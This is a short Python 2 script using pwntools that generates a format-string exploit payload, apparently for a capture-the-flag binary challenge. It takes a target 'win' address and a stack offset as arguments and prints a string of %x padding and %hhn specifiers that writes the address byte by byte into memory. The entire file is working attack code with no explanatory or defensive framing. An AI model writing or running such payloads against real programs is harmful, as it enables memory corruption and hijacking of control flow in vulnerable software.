import sys
from pwn import *

#win_addr = '0x8048536'
win_addr = sys.argv[1]
#offset = 3
offset = int(sys.argv[2])

if len(win_addr) == 9:
    #so the truncating part: [7:] [5:7] [3:5] 0+[2:3]
    payload = ""
    
    used = 16
    padding = int(win_addr[7:],16) - used
    payload += '%{}x'.format(padding)
    payload += '%{}$hhn'.format(offset)
    used = int(win_addr[7:],16)

    padding = int(win_addr[5:7],16) - used + 0x100 
    payload += '%{}x'.format(padding)
    payload += '%{}$hhn'.format(offset+1)
    used = int(win_addr[5:7],16)

    padding = int(win_addr[3:5],16) - used + 0x100
    payload += '%{}x'.format(padding)
    payload += '%{}$hhn'.format(offset+2)
    used = int(win_addr[3:5],16) 
    
    padding = int('0'+win_addr[2:3],16) - used + 0x100
    payload += '%{}x'.format(padding)
    payload += '%{}$hhn'.format(offset+3)

    print payload
elif len(win_addr) == 10:
    payload = ""

    used = 16
    padding = int(win_addr[8:],16) - used
    payload += '%{}x'.format(padding)
    payload += '%{}$hhn'.format(offset)
    used = int(win_addr[8:],16)

    padding = int(win_addr[6:8],16) - used + 0x100
    payload += '%{}x'.format(padding)
    payload += '%{}$hhn'.format(offset+1)
    used = int(win_addr[6:8],16)

    padding = int(win_addr[4:6],16) - used + 0x100
    payload += '%{}x'.format(padding)
    payload += '%{}$hhn'.format(offset+2)
    used = int(win_addr[4:6],16)

    padding = int('0'+win_addr[2:4],16) - used + 0x100
    payload += '%{}x'.format(padding)
    payload += '%{}$hhn'.format(offset+3)

    print payload
